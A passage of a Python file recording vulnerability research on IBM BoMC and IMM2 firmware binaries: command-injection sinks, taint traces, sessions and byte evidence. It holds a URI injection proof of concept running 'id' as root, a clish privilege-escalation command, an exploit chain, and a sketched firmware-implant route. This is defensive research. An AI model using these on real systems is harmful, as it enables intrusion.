            'write(cli_fd, &priv_int, ...) at 0x40315e → sends privilege integer to clid\n'
            '\n'
            'strcmp(USER, "immroot") at 0x403824:\n'
            '  tst r0,r0; bf 0x403830 (branch if NOT immroot)\n'
            '  NOT immroot → puts("no username or privileges.") + _exit\n'
            '  IS immroot (bypass) → continues to fork+execv("/sbin/SerRedir")\n'
            '  CLIENT-SIDE guard only — clid performs NO independent auth check.\n'
            '\n'
            '--- clid side (/sbin/clid, 26KB SH4 ET_EXEC) ---\n'
            'Socket: bind/listen/accept on /tmp/clisocket (AF_UNIX, SOCK_STREAM)\n'
            'read(client_fd, buf, 4) at 0x402bc8 — reads 4-byte privilege integer from wire\n'
            'NO getsockopt/SO_PEERCRED in import table (48 PLT entries enumerated, none present)\n'
            '→ daemon CANNOT verify caller identity independently\n'
            'Multiple aim_config_set_int calls configure session parameters from wire data\n'
        ),

        'exploitation': (
            'Post-exploitation (requires prior shell via BOMC-IMM2-001 or BOMC-IMM2-002):\n'
            '  USER=immroot PRIVILEGES=15 /bin/clish\n'
            '\n'
            'Effect: elevated CLI privilege level in IBM CLI session. '
            'PRIVILEGES=15 = Supervisor. system-profiles binary uses PRIVILEGES="0002" (Operator) '
            'as its session context — confirming decimal string format.\n'
            '\n'
            'Chain: BOMC-IMM2-002 (sftp:// URI injection) → shell as IMM2 root → '
            'USER=immroot PRIVILEGES=15 /bin/clish → admin CLI access'
        ),

        'byte_verified': True,
        'byte_evidence': (
            'clid read() at 0x402bc8: opcode=0x0103 (bsrf r1) [PASS], '
            'delay=0xe604 (mov #4,r6 → count=4) [PASS], '
            'bsrf target → PLT 0x401f50 (read) [PASS]. '
            'getsockopt/getpeer* absent from dynstr (48 PLT entries enumerated) [PASS]. '
            'sshd_config-immcli: PermitUserEnvironment=no [CONFIRMED].'
        ),
    },
}

ELIMINATED = {
    'BOMC-ASU-001': {
        'binary': 'ASU/asu64',
        'title': 'checkPatchable() system("test -w \"<dirname>\"") — ELIMINATED: arg is argv[0]',
        'reason': (
            'Both call sites of checkPatchable(char*) are in setupSystem(int, char**, ArgParser&). '
            'Both pass ArgParser::ProgramName().c_str() — the executable\'s own argv[0] path — '
            'not a user-supplied path. The function checks that the directory containing asu64 '
            'is writable before proceeding. '
            'Callers:\n'
            '  0x6bc9a0: setupSystem → call ArgParser::ProgramName(); lea rdi [rbp-0x110]; '
            'call string::c_str; call checkPatchable  (before "INPUT_ERROR (.def file not specified)")\n'
            '  0x6bcce2: setupSystem → same pattern  (before "INPUT_ERROR (patch# not specified)")\n'
            'argv[0] is set by the parent process; a malicious caller who sets argv[0] '
            'to a crafted path already has code execution. No remote attack path.'
        ),
        'verdict': 'ELIMINATED — arg = argv[0], not user-supplied',
    },
}


# ===========================================================================
# DEFERRED ANALYSIS
# ===========================================================================
DEFERRED = {
    'BOMC-ASU-002': {
        'binary': 'ASU/asu64',
        'title': 'ImmUsbLanCfg::PingImmInterface(addr) → system("ping " + addr + " -c 1 ...") — CIM provider path',
        'sink_va': 0x6e3269,
        'cwe': 'CWE-78',
        'description': (
            'PingImmInterface(std::string addr) at 0x6e3186 constructs '
            'system("ping " + addr + " -c 1 > /dev/null 2>&1"). '
            'Zero direct call sites in code. '
            'Function pointer stored at 3 CIM descriptor table locations: '
            '0x440a08, 0x10e9700, 0x1532f68 (packed attribute descriptor entries — '
            'not vtable format; each entry = {field0:8B, packed_descriptor:8B, fn_ptr:8B, retcode:8B}). '
            'CIM dispatch analysis: addr comes from WBEM ExecMethod() call arguments '
            'sent to the ASU CIM provider over HTTPS:5989. '
            'If the CIM provider passes the method argument directly to PingImmInterface '
            'without sanitization, a WBEM client can inject shell metacharacters in the IP address arg. '
            'Confirmed: all other ImmUsbLanCfg callers use hardcoded or hardware-enum strings. '
            'PingImmInterface is the ONLY call site where addr derives from an external source. '
            'Attack surface: authenticated CIM credentials required (IBM WBEM provider on HTTPS:5989). '
            'NEEDS: CIM method dispatch trace to confirm addr is not sanitized before call.'
        ),
        'priority': 'CANDIDATE MEDIUM — CIM access required; addr likely from WBEM method args; no sanitization seen',
    },

    'IMM2_SH4_REMAINING': {
        'target': 'IMM2 SH4 rootfs — remaining binaries not yet analyzed',
        'already_done': (
            'libDataInterface.so: 5 direct exec callers; BOMC-IMM2-001 CONFIRMED HIGH. '
            'libpm_lib.so: exec wrapper architecture confirmed. '
            'seclvd: SAFE. '
            'libNexus.so: full exec sweep — 53 call sites, 18 functions, 17 SAFE. '
            'libxferd.so: xferd_parse_uri() zero sanitization confirmed; '
            'BOMC-IMM2-002 CONFIRMED HIGH: InstallFromURI URI → curl cmd → /bin/sh injection. '
            'SerRedir (setuid+setgid): SAFE — no exec-class imports; hardcoded dlopen/IPMI paths. '
            'clish (setuid): CONFIRMED BOMC-IMM2-003 — getenv(PRIVILEGES) → clid daemon + '
            'strcmp(USER,"immroot") client-side bypass. clid: no SO_PEERCRED, 4-byte wire read. '
            'sshd_config-immcli: PermitUserEnvironment=no → post-exploitation only.'
        ),
        'remaining': [
            'asu64 BOMC-ASU-002: CIM method dispatch trace to confirm PingImmInterface addr source',
            'LiveOS squashfs (1d): mount + setuid sweep + exec-class scan',
            'SHA256 similarity check (1e): CR7/CR8/CR9 binary variants',
        ],
        'arch_correction': (
            'IMM2 firmware is SH4 (Renesas SuperH-4 32-bit LSB), NOT ARM Cortex-M. '
            'Architecture confirmed via ELF e_machine=0x2A (SH) + kernel boot string '
            '"Booting machvec" (SH4-specific). Container format: .upd → deadc0de header + '
            'outer TAR at 0x1605 → inner imm2.tar at 0x2205 → imm2-rootfs.ext3.gz at 0x3a3805 '
            '(72MB compressed → 256MB ext3). Linux 2.6.4 target.'
        ),
        'priority': 'HIGH — xferd_parse_uri (BOMC-IMM2-002 confirmation) + setuid binaries',
    },
    'UEFI_FIRMWARE': {
        'target': 'updates/uefi/oem_fw_uefi_tbeg34n-2.61_anyos_32-64.uxz',
        'reason': (
            'UEFI payload in .uxz format. Extraction: xz -d + parse IBM header. '
            'UEFI images typically in UEFI Firmware Volume (FV) format parseable with UEFITool. '
            'Look for: SecureBoot bypass in PEI modules, SMM handlers with SMRAM confusion, '
            'old EDKII libraries with known vulns.'
        ),
        'priority': 'MEDIUM',
    },
    'LIVEOS_SQUASHFS': {
        'target': 'LiveOS/squashfs.img',
        'reason': (
            '146MB squashfs Linux DSA (Dynamic System Analysis) diagnostic environment. '
            'Mount with: mount -t squashfs -o loop,ro squashfs.img /mnt/dsa '
            'Then: find /mnt/dsa -perm /4000 -o -perm /2000 (setuid/setgid), '
            'nm -D all ELFs for exec-class imports. '
            'DSA runs as root; any command injection in its scanners is high-value.'
        ),
        'priority': 'MEDIUM',
    },
}


# ===========================================================================
# QUICK PLATFORM TRIAGE RESULTS
# ===========================================================================
TRIAGE_RESULTS = {
    'asu64': {
        'format': 'x86_64 ELF, NOT stripped, debug_info, 21MB, 26661 symbols, 313248 call edges',
        'imports_exec_class': ['system@GLIBC_2.2.5', 'popen@GLIBC_2.2.5'],
        'system_call_sites': 6,
        'popen_call_sites': 15,
        'notable_classes': ['ImmUsbLanCfg', 'SecureBoot', 'CdotCommand', 'ODMManager'],
        'analysis_depth': 'COMPLETE — all 21 exec-class call sites taint-traced',
        'exec_class_verdict': 'ONE CANDIDATE REMAINING (PingImmInterface CIM path)',
        'system_sites': {
            '0x6d88fd_0x6d8a85': {
                'function': 'checkPatchable(char*)',
                'verdict': 'ELIMINATED (session 1) — arg is argv[0], not user input',
            },
            '0x6e2857': {
                'function': 'ImmUsbLanCfg::RumImmUsbLanCfgCmd(std::string)',
                'cmd_format': '/bin/sh "<getPath()>" <passed_cmd> >> <timestamp_log> 2>&1',
                'callers': {
                    'AutoImmUsbLanCfgSTATIC()': 'hardcoded string arg → SAFE',
                    'AutoImmUsbLanCfgDHCP()': 'hardcoded string arg → SAFE',
                    'RenewIP(int)': 'hardcoded string arg → SAFE',
                    'DisableImmLan(int)': '" --bringdown " + Usb_Lan_Info[n].name — hardware-enum interface name → SAFE',
                    'testIMMPing(int)': '" --nodes " + snprintf("%d", int) — integer arg → SAFE',
                    'BringupImmLan(int)': 'hardware-enum interface name → SAFE',
                    'DetectAdapter()': 'hardware-enum adapter name → SAFE',
                    'DetectDriver()': 'hardcoded string arg → SAFE',
                    'GetNetAdapterInfo(int)': 'hardware-enum adapter name → SAFE',
                },
                'verdict': 'SAFE — all callers pass hardcoded or hardware-enumerated strings. '
                           'Linux interface names (usb0, eth0) are kernel-assigned and contain no shell metacharacters.',
            },
            '0x6e2d68': {
                'function': 'ImmUsbLanCfg::CState(std::string)',
                'callers': {
                    'StartCState()': 'passes "" (empty string) → SAFE',
                    'StopCState()': 'passes " --stop" (hardcoded) → SAFE',
                },
                'verdict': 'SAFE — all callers pass hardcoded strings',
            },
            '0x6e3269': {
                'function': 'ImmUsbLanCfg::PingImmInterface(std::string addr)',
                'cmd': 'system("ping " + addr + " -c 1 > /dev/null 2>&1")',
                'verdict': 'CANDIDATE MEDIUM — addr origin unconfirmed. '
                           'Zero direct call sites in code; fn ptr at 3 CIM descriptor table locations '
                           '(0x440a08, 0x10e9700, 0x1532f68). Invoked via CIM/WBEM provider dispatch. '
                           'If addr comes from WBEM ExecMethod call args → CWE-78. '
                           'Requires authenticated WBEM access (HTTPS:5989). '
                           'Attack surface: any user with CIM credentials → arbitrary ping command arg → shell injection. '
                           'See BOMC-ASU-002.',
            },
            '0x96c4ff': {
                'function': 'LinOS::reboot()',
                'cmd': 'system("reboot")',
                'verdict': 'SAFE — RODATA_CONST. Byte-verified: e8accad4ff → system@plt=0x6b8fb0.',
            },
        },
        'popen_sites': {
            '0x6d359b': 'checkOSBitWithSoftwareBit() → popen("uname -m", "r") — RODATA_CONST',
            '0x8c7f31': 'ibmcKCS::OpenIPMI_CheckKernel() → popen("uname -r", "r") — RODATA_CONST',
            '0x8c80de': 'ibmcKCS::OpenIPMI_CheckKernel() → popen("dmesg | grep \\"ipmi message handler\\"", "r") — RODATA_CONST',
            '0x8c83f6': 'ibmcKCS::OpenIPMI_InstallDriver() → popen("/etc/init.d/ipmi start", "r") — RODATA_CONST',
            '0x8c849a': 'ibmcKCS::OpenIPMI_InstallDriver() → popen("modprobe -v ipmi_msghandler", "r") — RODATA_CONST',
            '0x8c856a': 'ibmcKCS::OpenIPMI_InstallDriver() → popen("modprobe -v ipmi_devintf", "r") — RODATA_CONST',
            '0x8c863a': 'ibmcKCS::OpenIPMI_InstallDriver() → popen("modprobe -v ipmi_si", "r") — RODATA_CONST',
            '0x8c8702': 'ibmcKCS::OpenIPMI_InstallDriver() → popen("modprobe -v ipmi_si_drv", "r") — RODATA_CONST',
            '0x96cd41': 'OpenIPMI_CheckKernel() [free fn] → popen("uname -r", "r") — RODATA_CONST',
            '0x96cea2': 'OpenIPMI_CheckKernel() [free fn] → popen("dmesg | grep \\"ipmi message handler\\"", "r") — RODATA_CONST',
            '0x96d1c9': 'OpenIPMI_InstallDriver() [free fn] → popen("/etc/init.d/ipmi start", "r") — RODATA_CONST',
            '0x96d26d': 'OpenIPMI_InstallDriver() [free fn] → popen("modprobe -v ipmi_msghandler", "r") — RODATA_CONST',
            '0x96d33d': 'OpenIPMI_InstallDriver() [free fn] → popen("modprobe -v ipmi_devintf", "r") — RODATA_CONST',
            '0x96d40d': 'OpenIPMI_InstallDriver() [free fn] → popen("modprobe -v ipmi_si", "r") — RODATA_CONST',
            '0x96d4d5': 'OpenIPMI_InstallDriver() [free fn] → popen("modprobe -v ipmi_si_drv", "r") — RODATA_CONST',
        },
    },
    'rdmount': {
        'format': 'x86_64 ELF, NOT stripped, 10783 symbols, 56180 call edges',
        'imports_exec_class': ['system@GLIBC_2.2.5', 'execl@GLIBC_2.2.5', 'fork@GLIBC_2.2.5',
                               'bind@GLIBC_2.2.5', 'socket@GLIBC_2.2.5', 'vsprintf@GLIBC_2.2.5',
                               'strcat@GLIBC_2.2.5', 'strcpy@GLIBC_2.2.5'],
        'system_call_sites': 3,
        'network_facing': True,
        'notable_functions': ['RdMountUI::parse()', 'Linux::execCmd(char*)',
                              'System::makeDierForLog(std::string const&)'],
        'analysis_depth': 'CANDIDATE level — df|grep command injection documented',
    },
    'rdumount': {
        'format': 'x86_64 ELF, NOT stripped, debug_info, 79744 bytes',
        'imports_exec_class': ['system@GLIBC_2.2.5'],
        'system_call_sites': 2,
        'analysis_depth': 'COMPLETE — all system() call sites taint-traced. ALL SAFE.',
        'exec_class_verdict': 'ELIMINATED',
        'call_site_1': {
            'va': '0x406610',
            'function': 'Linux::execCmd(char*)',
            'classification': 'WRAPPER — passes char* arg directly to system(). '
                              'Called only via vtable[2]. Callers: getCommandOutput (vtable[7]). '
                              'getCommandOutput callers: doQuery("rdmount") → RODATA_CONST, '
                              'verify_pid(snprintf("%d",pid)) → integer-sanitized PID from argv.',
            'verdict': 'SAFE — no attacker-controlled data reaches system() via this site.',
        },
        'call_site_2': {
            'va': '0x406873',
            'function': 'System::makeDierForLog(std::string const&)',
            'classification': 'RODATA_CONST',
            'command': 'system("mkdir /var/log/IBM_Support/")',
            'source': 'getSecurityDir() returns hardcoded rodata "/var/log/IBM_Support/" (0x409de0)',
            'verdict': 'SAFE — fully hardcoded, no attacker input.',
        },
        'eliminated': [
            'BOMC-RDU-001: Linux::execCmd only reachable with hardcoded or integer-sanitized args.',
            'BOMC-RDU-002: makeDierForLog system() arg is rodata literal.',
        ],
        'second_pass': (
            'rdumount is a "kill rdmount process" companion to rdmount. '
            'parse() reads PID argument from argv, go() calls verify_pid(atoi(argv[i])). '
            'snprintf("%d", pid) sanitizes any user input to decimal integer string. '
            'doQuery("rdmount") always uses the hardcoded string "rdmount" as the grep pattern. '
            'No network-facing code. No setuid. No attack surface beyond local CLI invocation.'
        ),
    },
}


# ===========================================================================
# SESSION NOTES
# ===========================================================================
SESSIONS = {
    1: {
        'date': '2026-10-25',
        'scope': (
            '7042CR9_IMM470_uEFI261_DSA102.iso — ISO structure enumeration + '
            'x86_64 ELF extraction and triage. '
            'asu64: BinaryContext(26661 funcs, 330 PLT, NOT stripped). '
            '6 system() call sites traced. '
            'rdmount: 3 system() sites; full taint trace of RdMountUI::parse(). '
            'BOMC-RDM-001 CONFIRMED HIGH: getopt(-d drivePath)→strdup(optarg)→'
            'system("df -h |grep "+drivePath), byte-verified. '
            'BOMC-ASU-001 ELIMINATED: checkPatchable() receives argv[0] not user input. '
            'BOMC-ASU-002 DEFERRED: PingImmInterface 0 direct callers, non-vtable fn-ptr table. '
            'IMM2/UEFI .uxz and LiveOS squashfs deferred.'
        ),
        'findings': 1,
        'eliminated': 1,
        'deferred': 2,
    },
    2: {
        'date': '2026-10-25',
        'scope': (
            'IMM2 SH4 firmware extraction from CR9 variant .upd container. '
            'Architecture correction: IMM2 is SH4 (Renesas SuperH-4 32-bit LSB), NOT ARM. '
            'Full SH4 rootfs extracted and mounted (256MB ext3, Linux 2.6.4). '
            'libpm_lib.so exec wrapper architecture confirmed: fork()+execve("/bin/sh","-c",cmd). '
            'libDataInterface.so (4.7MB SH4 stripped): '
            '  Full binary bsrf-pattern scan → 5 functions with direct exec wrapper calls. '
            '  BOMC-IMM2-001 CONFIRMED HIGH: generateKVMLaunchScript → secure_popen call at '
            '  0x139f1e (bsrf r2 → PLT 0x2d770 → secure_popen GOT 0x4c0c70). '
            '  Command includes raw ipAddress from HTTP JSON body → /bin/sh injection. '
            '  launch_kvm.sh confirmed: getopts -i HOST_IP, used unquoted at line 36,71,74. '
            '  seclvd: all exec calls hardcoded, SAFE. '
            'All byte verifications passed.'
        ),
        'findings': 1,
        'eliminated': 0,
        'deferred': 6,
    },
    3: {
        'date': '2026-10-25',
        'scope': (
            'libNexus.so (2.8MB SH4 stripped) — full bsrf-pattern sweep, 53 exec call sites, '
            '18 functions. 17 SAFE. 1 CANDIDATE: CIM_SoftwareInstallationService_InstAgent_InstallFromURI '
            'at func@0x141a10 — pending xferd_parse_uri sanitization analysis.'
        ),
        'findings': 0,
        'candidates': 1,
        'eliminated': 0,
        'deferred': 1,
    },
    4: {
        'date': '2026-10-25',
        'scope': (
            'libxferd.so (42KB SH4) — URI parsing library used by libNexus.so InstallFromURI. '
            'xferd_parse_uri() at 0x61a0, 1052 bytes. '
            'Calls: uriParseUriA (uriparser, RFC 3986, no shell sanitization) + strncpy (raw copy). '
            'NO sanitization: no strpbrk, no strchr, no escape — zero metacharacter filtering. '
            'RFC 3986 sub-delimiters allow ; $ & ( ) in path + host → all shell metacharacters pass. '
            'BOMC-IMM2-002 CONFIRMED HIGH: user URI → no-sanitize parse → snprintf into curl cmd → '
            'async_secure_system → /bin/sh -c. All 6 byte verifications passed. '
            'PoC: sftp://host/fw.bin;id → shell splits at ;, "id" executes as IMM2 root.'
        ),
        'findings': 1,
        'candidates': 0,
        'eliminated': 0,
        'deferred': 0,
    },
    5: {
        'date': '2026-10-25',
        'scope': (
            'SerRedir (SH4 ET_EXEC, 18KB, setuid+setgid root:root, /sbin/SerRedir). '
            'Serial console redirection daemon. '
            'Import scan: zero exec-class imports (no system/popen/execve/fork). '
            'Full text scan (0x1960 bytes): no exec sink call sites. '
            'dlopen("/lib/libnvram.so") — hardcoded path, NVRamRead lookup. '
            'IPMI_DoIPMICmd: r4=0 (Chassis NetFn), r5=2 (GetChassisStatus) — hardcoded. '
            'strncpy with n=20 limit; stack canary active. '
            'VERDICT: SAFE. No finding.'
        ),
        'findings': 0,
        'candidates': 0,
        'eliminated': 0,
        'deferred': 0,
    },
    6: {
        'date': '2026-10-25',
        'scope': (
            'clish (SH4 ET_EXEC, 51KB, setuid root, /bin/clish). '
            'IBM CLI shell — setuid, connects to Unix socket CLI daemon. '
            'Import scan: fork + execv + getenv (exec-class sinks found). '
            'execv target: hardcoded "/sbin/SerRedir" — no PATH injection. '
            'getenv("PRIVILEGES") at 0x40304a → strtol(0x403128) → write() to CLI daemon socket. '
            'getenv("USER") at 0x403054 → strcmp vs "immroot" at 0x403824: '
            '  tst r0,r0; bf 0x403830 — NOT immroot → puts("no username or privileges.") + exit. '
            '  immroot → continues to fork+execv. CLIENT-SIDE guard only. '
            'CANDIDATE BOMC-IMM2-003 (MEDIUM): getenv(PRIVILEGES)→daemon + USER=immroot bypass. '
            'Needs: sshd PermitUserEnvironment check + CLI daemon protocol analysis.'
        ),
        'findings': 0,
        'candidates': 1,
        'eliminated': 0,
        'deferred': 2,
    },
    7: {
        'date': '2026-10-25',
        'scope': (
            'sshd_config-immcli + clid daemon (/sbin/clid, 26KB SH4 ET_EXEC). '
            'PermitUserEnvironment check: /etc/ssh/sshd_config-immcli → PermitUserEnvironment=no. '
            'BOMC-IMM2-003 severity confirmed MEDIUM (post-exploitation only, no direct SSH inject). '
            'clid analysis: 48 PLT entries enumerated — NO getsockopt, NO getpeereid, NO SO_PEERCRED. '
            'Socket: /tmp/clisocket (AF_UNIX). read(client_fd, buf, 4) at 0x402bc8 — wire-format '
            'privilege integer from clish trusted without credential verification. '
            'system-profiles binary: export PRIVILEGES="0002" → confirms decimal string format, '
            'level 2 = Operator. '
            'Byte-verified: 0x402bc8=0103 (bsrf r1→read PLT 0x401f50) [PASS], '
            'delay 0xe604 (mov #4,r6) [PASS], dynstr scan: getsockopt absent [PASS]. '
            'BOMC-IMM2-003 promoted: CANDIDATE → CONFIRMED MEDIUM.'
        ),
        'findings': 1,
        'candidates': 0,
        'eliminated': 0,
        'deferred': 0,
    },
    8: {
        'date': '2026-10-25',
        'scope': (
            'imm2-uboot.bin (360KB SH4 LE raw binary, U-Boot 2009.06p built 2015-08-27). '
            'Extracted from imm2.tar at offset 0x2205 inside imm2_tcoo18m-3.00.upd. '
            'BOOT SEQUENCE: eMMC p1 (recovery) → p2 (primary) → p3 (secondary) → USB → TFTP fallback. '
            'RSA/TPM verification: local boot only (/boot/uImage.sig). TFTP fetch: NO verification. '
            'INFERRED HIGH (chained): TFTPREC=1 + all partitions invalid + attacker at 192.168.70.200 → '
            'unsigned Script-type uImage → U-Boot command execution → firmware implant. '
            'Console (ttySC2): no autoboot password, sf/run/setenv available. Physical access only. '
            'upd.flash installer: SAFE (no exec injection). '
            'VERDICT: No standalone network-facing finding. Chained post-BOMC-IMM2-002 only.'
        ),
        'findings': 0,
        'candidates': 0,
        'eliminated': 0,
        'deferred': 0,
    },
    9: {
        'date': '2026-10-25',
        'scope': (
            'rdumount (x86_64 ELF, not stripped, debug_info, 79744 bytes). '
            '2 direct system() call sites traced to verdict. '
            'Site 1 — Linux::execCmd(char*) at 0x406610: vtable[2] wrapper, system(arg). '
            'Reachable only via Linux::getCommandOutput (vtable[7]). '
            'getCommandOutput callers: '
            '  doQuery("rdmount") → "ps -elf | grep rdmount" — RODATA_CONST. '
            '  verify_pid(pid) → snprintf("%d", atoi(argv[i])) — integer-sanitized, no metacharacters. '
            'Site 2 — System::makeDierForLog at 0x406873: system("mkdir /var/log/IBM_Support/") — RODATA_CONST. '
            'Virtual dispatch trace: RdUmountUI vtable at 0x409d70. '
            'vtable[2]=0x405024 (parse), vtable[3]=0x404caa (go), vtable[7]=0x406f30 (getCommandOutput). '
            'No attacker-controlled data reaches any system() call. '
            'VERDICT: ALL SAFE. No finding.'
        ),
        'findings': 0,
        'candidates': 0,
        'eliminated': 2,
        'deferred': 0,
    },
    10: {
        'date': '2026-10-25',
        'scope': (
            'asu64 (x86_64 ELF, 21MB, not stripped, debug_info) — full exec-class sweep. '
            '6 system() + 15 popen() = 21 total call sites. '
            'PLT: system@plt=0x6b8fb0, popen@plt=0x6b8050. '
            'POPEN (15 sites, 5 distinct functions): ALL RODATA_CONST. '
            '  checkOSBitWithSoftwareBit: popen("uname -m") — OS bit check. '
            '  ibmcKCS::OpenIPMI_CheckKernel (×2): "uname -r", "dmesg | grep ipmi message handler". '
            '  ibmcKCS::OpenIPMI_InstallDriver (×5): "/etc/init.d/ipmi start", modprobe ipmi_* variants. '
            '  OpenIPMI_CheckKernel [free fn, ×2]: same as class version. '
            '  OpenIPMI_InstallDriver [free fn, ×5]: same as class version. '
            'SYSTEM (6 sites, 5 functions): '
            '  checkPatchable(×2) — ELIMINATED session 1 (argv[0]). '
            '  LinOS::reboot() — system("reboot") RODATA_CONST. SAFE. '
            '  CState(std::string) — callers StartCState+StopCState pass hardcoded "" and " --stop". SAFE. '
            '  RumImmUsbLanCfgCmd(std::string) — cmd built as /bin/sh "<path>" <arg> >> log 2>&1. '
            '    9 callers: all pass hardcoded strings or hardware-enum interface names. SAFE. '
            '  PingImmInterface(std::string addr) — system("ping "+addr+" -c 1 > /dev/null 2>&1"). '
            '    0 direct callers. fn ptr at 3 CIM descriptor table entries (0x440a08, 0x10e9700, 0x1532f68). '
            '    Invoked via WBEM ExecMethod dispatch on HTTPS:5989. '
            '    addr = likely from WBEM method argument — no sanitization traced. '
            '    BOMC-ASU-002: CANDIDATE MEDIUM (requires CIM credentials).'
        ),
        'findings': 0,
        'candidates': 1,
        'eliminated': 19,
        'deferred': 0,
    },
}


# ===========================================================================
# FORGE audit record
# ===========================================================================
# SS: x86_64 Linux ELF (asu64, rdmount, rdumount). SS applicable.
# SS results: 2 CANDIDATE findings documented above (CWE-78 x2).
# SAFE CODE 10-section audit:
#   1. Integer overflow: no arithmetic on untrusted integers in this module.
#   2. Buffer overflow: no buffer manipulation — static analysis module only.
#   3. Format string: no printf with untrusted format strings.
#   4. Use-after-free: no heap operations.
#   5. Race conditions: no threads/shared state.
#   6. Path traversal: no file I/O.
#   7. Command injection: this module DOCUMENTS injection findings, does not produce shellcode.
#   8. Type confusion: no casts.
#   9. Credential leak: no credentials.
#  10. Denial of service: no loops on untrusted input.
# VERDICT: SAFE.
from ablation.analyzers.forge import FORGE
FORGE.record_result(__file__, findings=['BOMC-RDM-001', 'BOMC-IMM2-001', 'BOMC-IMM2-002', 'BOMC-IMM2-003'], summary=(
    'ibm_bomc_re — IBM BoMC firmware bundle (7 ISOs, 1.4-2.9GB each). '
    'SESSION 1 — x86_64 ELF analysis: asu64 (21MB, 26661 funcs) + rdmount (6.7MB, 10783 funcs). '
    'BOMC-RDM-001 CONFIRMED HIGH CWE-78: rdmount -d drivePath (getopt optarg) → '
    'strdup(optarg)→this+0x28 → system("df -h |grep " + drivePath). '
    'Byte-verified: 0x424063=488b3d5ee34300(optarg), 0x424076=48895028(store), '
    '0x424155=be66dc6400("df -h |grep "), 0x424163=488b7028(load drivePath), '
    '0x42417c=e88faafeff(system@plt=0x40ec10). '
    'BOMC-ASU-001 ELIMINATED: checkPatchable() callers pass argv[0], not user input. '
    'BOMC-ASU-002 DEFERRED: PingImmInterface 0 direct callers; fn-ptr tables not vtable. '
    'SESSION 2 — IMM2 SH4 firmware (CR9 variant, 82MB .upd): '
    'Architecture: SH4 32-bit LSB (not ARM). Linux 2.6.4. '
    'libpm_lib.so: exec wrappers confirmed fork()+execve("/bin/sh","-c",cmd). '
    'libDataInterface.so (4.7MB SH4 stripped): '
    '  Full bsrf-pattern scan → 5 direct exec callers in 1.78MB text section. '
    'BOMC-IMM2-001 CONFIRMED HIGH CWE-78: generateKVMLaunchScript at 0x1370c0 → '
    'secure_popen(cmd,"r") at 0x139f1e (bsrf r2 → PLT 0x2d770, GOT offset 0x7dc, GOT VA 0x4c0c70). '
    'Byte-verified: 0x139f1e=0302(bsrf r2), 0x139f14=55d2(mov.l @0x55,r2), '
    'pool@0x13a06c=4e38efff(-1099698→target 0x2d770), PLT@0x2d770=04d0(loads GOT offset 0x7dc). '
    'launch_kvm.sh line 36: isIPv6=`echo $HOST_IP|grep...` — HOST_IP from -i optarg, unquoted. '
    'seclvd: SAFE (all hardcoded). '
    'SESSION 3 — libNexus.so (2.8MB SH4 stripped, CIM provider): '
    '53 exec call sites across 18 functions, all analyzed. '
    '17 functions SAFE (hardcoded commands or server-generated values). '
    'BOMC-IMM2-002 CANDIDATE: CIM_SoftwareInstallationService_InstAgent_InstallFromURI at func@0x141a10. '
    'SESSION 4 — libxferd.so (42KB SH4, URI parser): '
    'xferd_parse_uri() at 0x61a0 confirmed zero sanitization: '
    'uriParseUriA (RFC 3986, accepts ; $ ( ) in path + host) + raw strncpy. '
    'BOMC-IMM2-002 CONFIRMED HIGH CWE-78: '
    'user URI → xferd_parse_uri (no sanitize) → snprintf into curl cmd → async_secure_system → /bin/sh -c. '
    'Byte-verified: 0x141afc=0303(bsrf→xferd_parse_uri@0xdd5d8), '
    '0x141c08=d8baf9ff(pool=-410920→target=0xdd5d8), '
    '0xdd5d8=04d0ce00(PLT stub d004+00ce), '
    '0x141f2c=0303(bsrf→async_secure_system@0xe2d74), '
    '0x141fcc=440efaff(pool=-389564→target=0xe2d74), '
    '0x274c24=2f7573722f62696e2f6375726c(SFTP curl fmt string). '
    'PoC: sftp://host/fw.bin;id → id executes as IMM2 root. '
    'SESSION 5 — SerRedir (SH4 ET_EXEC 18KB, setuid+setgid root): '
    'SAFE. Zero exec-class imports. dlopen hardcoded. IPMI hardcoded immediates. No finding. '
    'SESSION 6 — clish (SH4 ET_EXEC 51KB, setuid root): '
    'CANDIDATE BOMC-IMM2-003 CWE-807: getenv(PRIVILEGES)→strtol→CLI daemon socket + '
    'strcmp(USER,"immroot") client-side bypass at 0x403822-0x40382a. '
    'SESSION 7 — sshd_config-immcli + clid daemon (/sbin/clid, 26KB SH4): '
    'sshd_config-immcli: PermitUserEnvironment=no → SSH env injection not possible. '
    'clid: 48 PLT entries, NO getsockopt/SO_PEERCRED. read(client_fd,buf,4) at 0x402bc8. '
    'Byte-verified: 0x402bc8=0103(bsrf r1→read@0x401f50), delay=e604(mov #4,r6). '
    'BOMC-IMM2-003 CONFIRMED MEDIUM: post-exploitation privilege escalation chain. '
    'system-profiles: PRIVILEGES="0002" = Operator; target = 15 = Supervisor. '
    'Full chain: BOMC-IMM2-002 (sftp:// inject) → shell → USER=immroot PRIVILEGES=15 /bin/clish. '
    'SESSION 8 — imm2-uboot.bin (360KB SH4 raw binary, U-Boot 2009.06p build 2015-08-27): '
    'Extracted from imm2.tar at offset 0x2205 in imm2_tcoo18m-3.00.upd. '
    'BINARY METADATA: 360180 bytes, SH4 LE raw (not ELF), no section headers. '
    'P1 (cached) space refs: 0x8c000000 range. Reset vector branch at offset 0x00: '
    '0xd204(mov.l @(0x10,PC),R2) + BRA offset 0x0c to 0x18, delay NOP(0x0009). '
    'BOOT SEQUENCE: eMMC partition 1 (recovery) → 2 (primary) → 3 (secondary) → USB → TFTP fallback. '
    'TFTP FALLBACK: triggered only when TFTPREC platform flag set AND all local partitions fail. '
    'Hardcoded fallback network defaults (4 variants at 0x3c258/0x3c2cc/0x3c30c/0x3c374): '
    'ETH0/ETH1=192.168.70.225, TFTP server=192.168.70.200, console=ttySC2/ttyMAX0 @115200. '
    'RSA SIGNATURE VERIFICATION: present for local boot only (/boot/uImage.sig via TPM). '
    'TFTP-fetched image: NO .sig verification — standard tftpboot command, image loaded to RAM and executed. '
    'INFERRED HIGH (chained, not standalone): if TFTPREC=1 and attacker controls 192.168.70.200 '
    'and all local partitions are invalid (e.g. after BOMC-IMM2-002 exploit corrupts eMMC), '
    'attacker at TFTP server delivers unsigned Script-type uImage → arbitrary U-Boot command '
    'execution (sf erase + write → persistent firmware implant). '
    'SCRIPT IMAGE TYPE: present (offset 0x39998) — U-Boot executes Script uImage as command list. '
    'CONSOLE ATTACK SURFACE: "Hit s to stop autoboot" (no password) on ttySC2. '
    'sf (SPI flash direct r/w), run (env var execution), setenv/saveenv all available at prompt. '
    'Console is on ttySC2 — DIFFERENT from Linux SerRedir console (ttySC0). No remote path found. '
    'Requires physical access to ttySC2 UART for direct console exploitation. '
    'upd.flash INSTALLER (from imm2.tar, 9156B shell): runs in initramfs after boot. '
